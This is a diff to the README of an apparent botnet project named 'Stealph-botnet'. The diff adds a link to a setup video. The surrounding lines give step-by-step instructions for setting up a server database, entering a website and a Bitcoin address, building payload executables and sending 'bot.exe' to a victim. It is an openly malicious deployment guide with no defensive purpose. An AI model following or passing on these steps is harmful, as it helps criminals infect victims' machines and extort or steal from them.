@@ -16,8 +16,11 @@ and now go to phpmyadmin and import u251400708_brain.sql and go back to you file
 and enter you website url without http
 and in second text field add you btc address (dont use user personal btc address)
 and click build now go to dist folder recently created you will find a mai.exe.Stealph file  now go back  to your website and uplaod  this in your website and now run builder.exe and and enter you website name click build Xdrop now you will find a bot.exe send this to you victim and enjoy.
+# video how to setup:
 
+https://www.facebook.com/script1337/videos/2110808289160093/
 # Done enjoy!!!
+ 
 
 ![Screenshot](https://github.com/ScRiPt1337/Stealph-botnet/blob/master/Capture.PNG)
 
